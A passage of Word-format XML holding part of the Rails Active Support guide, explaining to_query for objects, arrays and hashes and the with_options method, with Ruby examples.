    </w:p>
    <w:p w14:paraId="51E43E04" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Except for hashes, given an unescaped </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> this method constructs the part of a query string that would map such key to what </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_param</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> returns. For example, given</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4320"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7F75FA8D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C2BF1CD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7CE810D9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>to_param</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6DDB4AB1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    "#{id}-#{name.parameterize}"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10CD5DDE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3196C0FA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6C19FB37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>we get:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="6ADD0B07" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3BC760E5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2036080051"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>current_user.to_query('user') # =&gt; user=357-john-smith</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3CFD0394" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This method escapes whatever is needed, both for the key and the value:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5280"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4FC75C02" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="517F1E4E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>account.to_query('company[name]')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="14BA7280" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "company%5Bname%5D=Johnson+%26+Johnson"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2E21ABD1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>so its output is ready to be used in a query string.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC94AC3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Arrays return the result of applying </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_query</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to each element with </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>key</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>[]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as key, and join the result with “&amp;”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5040"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3810D16E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="314612E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>[3.4, -45.6].to_query('sample')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="684EF4C3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "sample%5B%5D=3.4&amp;sample%5B%5D=-45.6"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="783F34B6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Hashes also respond to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_query</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> but with a different signature. If no argument is passed a call generates a sorted series of key/value assignments calling </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>to_query(key)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> on its values. Then it joins the result with “&amp;”:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6383"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="500E9589" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2BD61C76" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1180580824"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:c</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 3, :b</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2, :a</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 1}.to_query # =&gt; "a=1&amp;b=2&amp;c=3"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A8B8B39" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Hash#to_query</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> accepts an optional namespace for the keys:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5975"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0ACCAFF8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3668FD79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>{:id</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 89, :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "John Smith"}.to_query('user')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74D0D6C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># =&gt; "user%5Bid%5D=89&amp;user%5Bname%5D=John+Smith"</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="69877390" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/to_query.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C695D8B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.9 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>with_options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41364522" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The method </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>with_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> provides a way to factor out common options in a series of method calls.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A070690" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Given a default options hash, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>with_options</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> yields a proxy object to a block. Within the block, methods called on the proxy are forwarded to the receiver with their options merged. For example, you get rid of the duplication in:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5688"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0D0D452C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5A939AA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6BA0D86D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :customers, :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="149BACAF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :products,  :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="333C7C62" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :invoices,  :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="327C8808" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  has_many :expenses,  :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E7B58DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="51235AA9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>this way:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5783"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="696D0A2E" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5459EFA4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Account &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="194B5626" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  with_options :dependent</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :destroy</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|assoc|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A34B509" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assoc.has_many :customers</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5312142D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assoc.has_many :products</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="779CF090" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assoc.has_many :invoices</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AC5CBEE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assoc.has_many :expenses</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="712D60F8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="74EDFF6E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="172C8438" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That idiom may convey </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>grouping</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the reader as well. For example, say you want to send a newsletter whose language depends on the user. Somewhere in the mailer you could group locale-dependent bits like this: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3534B01" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="21D91556" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>I18n.with_options :locale</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; user.locale, :scope</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "newsletter"</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|i18n|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2014588A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  subject i18n.t :subject</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="479566DF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
